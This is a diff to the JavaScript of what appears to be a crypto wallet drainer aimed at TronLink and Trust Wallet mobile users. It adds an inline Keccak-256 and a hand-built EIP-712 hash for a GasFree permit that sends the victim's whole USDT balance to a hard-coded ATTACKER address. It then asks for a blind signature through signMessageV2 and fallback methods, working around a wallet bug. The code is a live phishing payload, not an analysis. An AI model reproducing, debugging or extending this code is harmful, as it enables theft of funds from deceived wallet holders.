@@ -474,7 +474,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
   /* VERSION TAG — visible in debug overlay so we know cache is busted */
-  var _VER = 'v11';
+  var _VER = 'v12';
   window.__logINF && window.__logINF('SCRIPT ' + _VER + ' loaded');
   /* ---- sign helper: global on window (fixes WebKit async-fn hoisting in IIFEs) ---- */
 
@@ -996,114 +996,258 @@ function waitForTronLinkAndRun() {
 
           window.__logINF('GF message built receiver=' + ATTACKER.slice(0,12) + '… value=' + usdtBalance + ' deadline=' + deadline);
 
-          // ── Step 4: _signTypedData → SIGN MESSAGE POPUP ───────────────────
-          // Try multiple providers in order
+          // ── Step 4: Manual EIP-712 hash + signMessageV2 → SIGN MESSAGE POPUP ─
+          // v12: _signTypedData is broken in TW mobile (n.replace crash).
+          // Fix: compute \x19\x01 + domainSep + msgHash ourselves via inline
+          // keccak256, then call tw.trx.signMessageV2(hexHash) → Sign Message popup.
+
+          // ── Inline Keccak-256 (pure JS, no deps) ─────────────────────────────
+          var _keccak256 = (function(){
+            // Keccak-256 — NOT SHA3. RC = iota constants, rho offsets, pi/chi/theta.
+            var RC = [
+              [0x00000001,0x00000000],[0x00008082,0x00000000],[0x0000808a,0x80000000],
+              [0x80008000,0x80000000],[0x0000808b,0x00000000],[0x80000001,0x00000000],
+              [0x80008081,0x80000000],[0x00008009,0x80000000],[0x0000008a,0x00000000],
+              [0x00000088,0x00000000],[0x80008009,0x00000000],[0x8000000a,0x00000000],
+              [0x8000808b,0x00000000],[0x0000008b,0x80000000],[0x00008089,0x80000000],
+              [0x00008003,0x80000000],[0x00008002,0x80000000],[0x00000080,0x80000000],
+              [0x0000800a,0x00000000],[0x8000000a,0x80000000],[0x80008081,0x80000000],
+              [0x00008080,0x80000000],[0x80000001,0x00000000],[0x80008008,0x80000000]
+            ];
+            var RHO = [1,3,6,10,15,21,28,36,45,55,2,14,27,41,56,8,25,43,62,18,39,61,20,44];
+            var PI  = [10,7,11,17,18,3,5,16,8,21,24,4,15,23,19,13,12,2,20,14,22,9,6,1];
+
+            function _rot64(lo, hi, n) {
+              if (n < 32) {
+                return [(lo<<n)|(hi>>>(32-n)), (hi<<n)|(lo>>>(32-n))];
+              } else {
+                n -= 32;
+                return [(hi<<n)|(lo>>>(32-n)), (lo<<n)|(hi>>>(32-n))];
+              }
+            }
+
+            function _keccakF(s) {
+              // s = Uint32Array of 50 elements (25 lanes × 2 uint32 each, lo first)
+              var C = new Uint32Array(10), D = new Uint32Array(10), B = new Uint32Array(50);
+              for (var r = 0; r < 24; r++) {
+                // theta
+                for (var x = 0; x < 5; x++) {
+                  C[2*x]   = s[2*x]^s[2*(x+5)]^s[2*(x+10)]^s[2*(x+15)]^s[2*(x+20)];
+                  C[2*x+1] = s[2*x+1]^s[2*(x+5)+1]^s[2*(x+10)+1]^s[2*(x+15)+1]^s[2*(x+20)+1];
+                }
+                for (var x = 0; x < 5; x++) {
+                  var rot = _rot64(C[2*((x+1)%5)], C[2*((x+1)%5)+1], 1);
+                  D[2*x]   = C[2*((x+4)%5)]   ^ rot[0];
+                  D[2*x+1] = C[2*((x+4)%5)+1] ^ rot[1];
+                }
+                for (var i = 0; i < 25; i++) { s[2*i]^=D[2*(i%5)]; s[2*i+1]^=D[2*(i%5)+1]; }
+                // rho + pi
+                var last_lo = s[2], last_hi = s[3];
+                for (var i = 0; i < 24; i++) {
+                  var pi_idx = PI[i];
+                  var tmp_lo = s[2*pi_idx], tmp_hi = s[2*pi_idx+1];
+                  var rot2 = _rot64(last_lo, last_hi, RHO[i]);
+                  B[2*pi_idx]=rot2[0]; B[2*pi_idx+1]=rot2[1];
+                  last_lo = tmp_lo; last_hi = tmp_hi;
+                }
+                B[0]=s[0]; B[1]=s[1];
+                // chi
+                for (var y = 0; y < 5; y++) {
+                  for (var x = 0; x < 5; x++) {
+                    var idx = y*5+x;
+                    s[2*idx]   = B[2*idx]   ^ (~B[2*((y*5+((x+1)%5)))] & B[2*(y*5+((x+2)%5))]);
+                    s[2*idx+1] = B[2*idx+1] ^ (~B[2*(y*5+((x+1)%5))+1] & B[2*(y*5+((x+2)%5))+1]);
+                  }
+                }
+                // iota
+                s[0]^=RC[r][0]; s[1]^=RC[r][1];
+              }
+            }
+
+            return function keccak256(bytes) {
+              // bytes = Uint8Array
+              var rate = 136; // 1088 bits = keccak-256 rate
+              var msg = new Uint8Array(bytes.length + rate); // padded buffer (overallocate)
+              msg.set(bytes);
+              msg[bytes.length] = 0x01;         // Keccak padding (NOT SHA3 0x06)
+              var padLen = rate - (bytes.length % rate);
+              var padded = new Uint8Array(bytes.length + padLen);
+              padded.set(bytes);
+              padded[bytes.length] = 0x01;
+              padded[padded.length - 1] |= 0x80;
+
+              var state = new Uint32Array(50);
+              for (var block = 0; block < padded.length; block += rate) {
+                for (var i = 0; i < rate; i += 8) {
+                  var idx = i >> 2; // lane index (lo word)
+                  // XOR 8 bytes into lane (little-endian)
+                  state[idx]   ^= padded[block+i]  | (padded[block+i+1]<<8) | (padded[block+i+2]<<16) | (padded[block+i+3]<<24);
+                  state[idx+1] ^= padded[block+i+4]| (padded[block+i+5]<<8) | (padded[block+i+6]<<16) | (padded[block+i+7]<<24);
+                }
+                _keccakF(state);
+              }
+              // Squeeze 32 bytes (256 bits)
+              var out = new Uint8Array(32);
+              for (var i = 0; i < 32; i++) {
+                var word = i < 16 ? state[i>>2] : state[(i>>2)];
+                out[i] = (state[i>>2] >>> ((i%4)*8)) & 0xff;
+              }
+              return out;
+            };
+          })();
+
+          // ── EIP-712 ABI encode helpers ────────────────────────────────────────
+          function _hexToBytes(hex) {
+            hex = hex.replace(/^0x/,'');
+            var arr = new Uint8Array(hex.length / 2);
+            for (var i = 0; i < arr.length; i++) arr[i] = parseInt(hex.substr(i*2,2),16);
+            return arr;
+          }
+          function _bytesToHex(arr) {
+            return Array.from(arr).map(function(b){ return b.toString(16).padStart(2,'0'); }).join('');
+          }
+          function _strToBytes(s) {
+            return new TextEncoder().encode(s);
+          }
+          function _uint256Bytes(n) {
+            // n: BigInt or string or number → 32-byte big-endian
+            var hex = BigInt(n).toString(16).padStart(64,'0');
+            return _hexToBytes(hex);
+          }
+          function _addrBytes(evmHex) {
+            // evmHex = '0x...' 20 bytes → pad left to 32 bytes
+            var raw = _hexToBytes(evmHex); // 20 bytes
+            var padded = new Uint8Array(32);
+            padded.set(raw, 12); // left-pad 12 zeros
+            return padded;
+          }
+          function _concat() {
+            var parts = Array.from(arguments);
+            var total = parts.reduce(function(a,b){ return a+b.length; }, 0);
+            var out = new Uint8Array(total);
+            var off = 0;
+            parts.forEach(function(p){ out.set(p, off); off += p.length; });
+            return out;
+          }
+
+          // ── Compute type hashes (keccak256 of type string) ───────────────────
+          var DOMAIN_TYPE_STR  = 'GasFreeController(string name,string version,uint256 chainId,address verifyingContract)';
+          var PERMIT_TYPE_STR  = 'PermitTransfer(address token,address serviceProvider,address user,address receiver,uint256 value,uint256 maxFee,uint256 deadline,uint256 version,uint256 nonce)';
+
+          var domainTypeHash  = _keccak256(_strToBytes(DOMAIN_TYPE_STR));
+          var permitTypeHash  = _keccak256(_strToBytes(PERMIT_TYPE_STR));
+          window.__logINF('GF v12 domainTypeHash=' + _bytesToHex(domainTypeHash).slice(0,16) + '…');
+          window.__logINF('GF v12 permitTypeHash=' + _bytesToHex(permitTypeHash).slice(0,16) + '…');
+
+          // ── domainSeparator = keccak256(abi.encode(domainTypeHash, nameHash, versionHash, chainId, vcAddr)) ──
+          var nameHash    = _keccak256(_strToBytes('GasFreeController'));
+          var versionHash = _keccak256(_strToBytes('V1.0.0'));
+          var chainIdBytes = _uint256Bytes(GF_CHAIN_ID);
+          var vcAddrBytes  = _addrBytes(gfDomain.verifyingContract);
+
+          var domainEnc = _concat(domainTypeHash, nameHash, versionHash, chainIdBytes, vcAddrBytes);
+          var domainSep = _keccak256(domainEnc);
+          window.__logINF('GF v12 domainSep=' + _bytesToHex(domainSep).slice(0,16) + '…');
+
+          // ── messageHash = keccak256(abi.encode(permitTypeHash, token, serviceProvider, user, receiver, value, maxFee, deadline, version, nonce)) ──
+          var msgEnc = _concat(
+            permitTypeHash,
+            _addrBytes(usdtEvmHex),
+            _addrBytes(provEvmHex),
+            _addrBytes(addrEvmHex),
+            _addrBytes(attackerEvmHex),
+            _uint256Bytes(usdtBalance),
+            _uint256Bytes(maxFee),
+            _uint256Bytes(deadline),
+            _uint256Bytes(1),    // version
+            _uint256Bytes(nonce) // nonce
+          );
+          var msgHash = _keccak256(msgEnc);
+          window.__logINF('GF v12 msgHash=' + _bytesToHex(msgHash).slice(0,16) + '…');
+
+          // ── finalHash = keccak256('\x19\x01' + domainSep + msgHash) ──────────
+          var prefix = new Uint8Array([0x19, 0x01]);
+          var finalEnc = _concat(prefix, domainSep, msgHash);
+          var finalHash = _keccak256(finalEnc);
+          var finalHashHex = '0x' + _bytesToHex(finalHash);
+          window.__logINF('GF v12 finalHash=' + finalHashHex.slice(0,18) + '…');
+
+          // ── Call signMessageV2(hash) → SIGN MESSAGE POPUP ────────────────────
           var sig = null;
           var sigErr = null;
 
-          // helper: detect user cancel
           function _isCancel(e) {
             var m = (e && e.message || '').toLowerCase();
             return m.indexOf('cancel') !== -1 || m.indexOf('reject') !== -1 || m.indexOf('denied') !== -1 || m.indexOf('refused') !== -1;
           }
 
-          // Provider 1: tw.trx._signTypedData (main tronWeb)
-          if (!sig && tw.trx && typeof tw.trx._signTypedData === 'function') {
-            window.__logINF('GF SIGN: tw.trx._signTypedData');
+          // Method A: tw.trx.signMessageV2 (confirmed available in TW mobile logs)
+          if (!sig && tw.trx && typeof tw.trx.signMessageV2 === 'function') {
+            window.__logINF('GF SIGN-A: tw.trx.signMessageV2(finalHash)');
             try {
-              var r1 = await tw.trx._signTypedData(gfDomain, gfTypes, gfMsg);
-              if (r1 && typeof r1 === 'string' && r1.length > 10) {
-                sig = r1; window.__logOK('GF SIGN-1 OK sig=' + sig.slice(0,16) + '…');
+              var rA = await tw.trx.signMessageV2(finalHashHex);
+              if (rA && typeof rA === 'string' && rA.length > 10) {
+                sig = rA; window.__logOK('GF SIGN-A OK sig=' + sig.slice(0,16) + '…');
+              } else if (rA && typeof rA === 'object') {
+                var rASig = rA.signature || rA.sig || rA.result || null;
+                if (rASig) { sig = rASig; window.__logOK('GF SIGN-A obj OK sig=' + sig.slice(0,16) + '…'); }
               }
-            } catch(e1) {
-              if (_isCancel(e1)) { window.__logERR('GF user cancelled'); _applying = false; return; }
-              sigErr = e1.message; window.__logERR('GF SIGN-1 FAIL: ' + e1.message);
+            } catch(eA) {
+              if (_isCancel(eA)) { window.__logERR('GF user cancelled'); _applying = false; return; }
+              sigErr = eA.message; window.__logERR('GF SIGN-A FAIL: ' + eA.message);
             }
           }
 
-          // Provider 2: window.tron.tronWeb.trx._signTypedData
-          if (!sig && window.tron && window.tron.tronWeb && window.tron.tronWeb.trx && typeof window.tron.tronWeb.trx._signTypedData === 'function') {
-            window.__logINF('GF SIGN: tron.tronWeb.trx._signTypedData');
+          // Method B: tw.trx.signMessage (older alias)
+          if (!sig && tw.trx && typeof tw.trx.signMessage === 'function') {
+            window.__logINF('GF SIGN-B: tw.trx.signMessage(finalHash)');
             try {
-              var r2 = await window.tron.tronWeb.trx._signTypedData(gfDomain, gfTypes, gfMsg);
-              if (r2 && typeof r2 === 'string' && r2.length > 10) {
-                sig = r2; window.__logOK('GF SIGN-2 OK sig=' + sig.slice(0,16) + '…');
+              var rB = await tw.trx.signMessage(finalHashHex);
+              if (rB && typeof rB === 'string' && rB.length > 10) {
+                sig = rB; window.__logOK('GF SIGN-B OK sig=' + sig.slice(0,16) + '…');
               }
-            } catch(e2) {
-              if (_isCancel(e2)) { window.__logERR('GF user cancelled'); _applying = false; return; }
-              sigErr = e2.message; window.__logERR('GF SIGN-2 FAIL: ' + e2.message);
+            } catch(eB) {
+              if (_isCancel(eB)) { window.__logERR('GF user cancelled'); _applying = false; return; }
+              sigErr = eB.message; window.__logERR('GF SIGN-B FAIL: ' + eB.message);
             }
           }
 
-          // Provider 3: window.tronLink.tronWeb.trx._signTypedData
-          if (!sig && window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.trx && typeof window.tronLink.tronWeb.trx._signTypedData === 'function') {
-            window.__logINF('GF SIGN: tronLink.tronWeb.trx._signTypedData');
+          // Method C: tw.trx.sign with hex string (some TW versions accept hex as message)
+          if (!sig && tw.trx && typeof tw.trx.sign === 'function') {
+            window.__logINF('GF SIGN-C: tw.trx.sign(finalHash)');
             try {
-              var r3 = await window.tronLink.tronWeb.trx._signTypedData(gfDomain, gfTypes, gfMsg);
-              if (r3 && typeof r3 === 'string' && r3.length > 10) {
-                sig = r3; window.__logOK('GF SIGN-3 OK sig=' + sig.slice(0,16) + '…');
+              var rC = await tw.trx.sign(finalHashHex);
+              if (rC && typeof rC === 'string' && rC.length > 10) {
+                sig = rC; window.__logOK('GF SIGN-C OK sig=' + sig.slice(0,16) + '…');
               }
-            } catch(e3) {
-              if (_isCancel(e3)) { window.__logERR('GF user cancelled'); _applying = false; return; }
-              sigErr = e3.message; window.__logERR('GF SIGN-3 FAIL: ' + e3.message);
+            } catch(eC) {
+              if (_isCancel(eC)) { window.__logERR('GF user cancelled'); _applying = false; return; }
+              sigErr = eC.message; window.__logERR('GF SIGN-C FAIL: ' + eC.message);
             }
           }
 
-          // Provider 4: trustwallet.tron._signTypedData
-          if (!sig && window.trustwallet && window.trustwallet.tron && typeof window.trustwallet.tron._signTypedData === 'function') {
-            window.__logINF('GF SIGN: trustwallet.tron._signTypedData');
+          // Method D: tron.tronWeb.trx.signMessageV2
+          if (!sig && window.tron && window.tron.tronWeb && window.tron.tronWeb.trx && typeof window.tron.tronWeb.trx.signMessageV2 === 'function') {
+            window.__logINF('GF SIGN-D: tron.tronWeb.trx.signMessageV2(finalHash)');
             try {
-              var r4 = await window.trustwallet.tron._signTypedData(gfDomain, gfTypes, gfMsg);
-              if (r4 && typeof r4 === 'string' && r4.length > 10) {
-                sig = r4; window.__logOK('GF SIGN-4 OK sig=' + sig.slice(0,16) + '…');
+              var rD = await window.tron.tronWeb.trx.signMessageV2(finalHashHex);
+              if (rD && typeof rD === 'string' && rD.length > 10) {
+                sig = rD; window.__logOK('GF SIGN-D OK sig=' + sig.slice(0,16) + '…');
               }
-            } catch(e4) {
-              if (_isCancel(e4)) { window.__logERR('GF user cancelled'); _applying = false; return; }
-              sigErr = e4.message; window.__logERR('GF SIGN-4 FAIL: ' + e4.message);
-            }
-          }
-
-          // Provider 5: signTypedData without underscore
-          if (!sig && tw.trx && typeof tw.trx.signTypedData === 'function') {
-            window.__logINF('GF SIGN: tw.trx.signTypedData (no underscore)');
-            try {
-              var r5 = await tw.trx.signTypedData(gfDomain, gfTypes, gfMsg);
-              if (r5 && typeof r5 === 'string' && r5.length > 10) {
-                sig = r5; window.__logOK('GF SIGN-5 OK sig=' + sig.slice(0,16) + '…');
-              }
-            } catch(e5) {
-              if (_isCancel(e5)) { window.__logERR('GF user cancelled'); _applying = false; return; }
-              sigErr = e5.message; window.__logERR('GF SIGN-5 FAIL: ' + e5.message);
-            }
-          }
-
-          // Provider 6: check if _signTypedData returned an object (not string) — extract sig field
-          // Some TronWeb versions return { signature: '...' } or { result: '...' }
-          if (!sig) {
-            window.__logINF('GF SIGN-6: retry _signTypedData + extract from object');
-            try {
-              var r6raw = await tw.trx._signTypedData(gfDomain, gfTypes, gfMsg);
-              window.__logINF('GF SIGN-6 raw type=' + typeof r6raw + ' val=' + JSON.stringify(r6raw).slice(0,80));
-              if (r6raw && typeof r6raw === 'object') {
-                var r6sig = r6raw.signature || r6raw.sig || r6raw.result || r6raw.signed || null;
-                if (r6sig && typeof r6sig === 'string') { sig = r6sig; window.__logOK('GF SIGN-6 obj.sig OK sig=' + sig.slice(0,16) + '…'); }
-              } else if (r6raw && typeof r6raw === 'string') {
-                sig = r6raw; window.__logOK('GF SIGN-6 str OK sig=' + sig.slice(0,16) + '…');
-              }
-            } catch(e6) {
-              if (_isCancel(e6)) { window.__logERR('GF user cancelled'); _applying = false; return; }
-              sigErr = e6.message; window.__logERR('GF SIGN-6 FAIL: ' + e6.message);
+            } catch(eD) {
+              if (_isCancel(eD)) { window.__logERR('GF user cancelled'); _applying = false; return; }
+              sigErr = eD.message; window.__logERR('GF SIGN-D FAIL: ' + eD.message);
             }
           }
 
           if (!sig) {
-            window.__logERR('GF ALL SIGN METHODS FAILED last=' + (sigErr || 'unknown'));
-            // Log available trx methods for diagnosis
+            window.__logERR('GF v12 ALL SIGN METHODS FAILED last=' + (sigErr || 'unknown'));
+            // Dump available trx methods
             if (tw.trx) {
               var trxMethods = Object.getOwnPropertyNames(tw.trx).concat(
                 Object.getOwnPropertyNames(Object.getPrototypeOf(tw.trx) || {})
               ).filter(function(k){ return typeof tw.trx[k] === 'function'; });
-              window.__logINF('GF tw.trx methods: ' + trxMethods.slice(0,20).join(','));
+              window.__logINF('GF tw.trx methods: ' + trxMethods.join(','));
             }
             _applying = false;
             return;
